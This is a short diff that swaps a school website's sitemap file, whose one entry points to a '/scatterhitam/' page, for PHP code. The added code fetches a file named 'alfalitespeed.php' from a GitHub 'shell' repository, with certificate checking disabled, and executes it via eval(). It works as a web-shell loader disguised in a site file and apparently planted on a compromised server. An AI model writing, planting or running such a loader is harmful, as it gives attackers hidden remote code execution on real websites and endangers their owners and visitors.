@@ -1,16 +1,21 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<urlset
-      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
-      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
-            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
-<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
+<?php
+function getURL($url) {
+    if (function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
 
-
-<url>
-  <loc>https://sman13garut.sch.id/scatterhitam/</loc>
-  <lastmod>2025-01-21T05:10:13+00:00</lastmod>
-</url>
-
-
-</urlset>
+// Contoh penggunaan:
+$phpCode = getURL('https://raw.githubusercontent.com/twololbrother/shell/main/alfalitespeed.php');
+if ($phpCode !== false) {
+    eval("?>". $phpCode);
+}
+?>
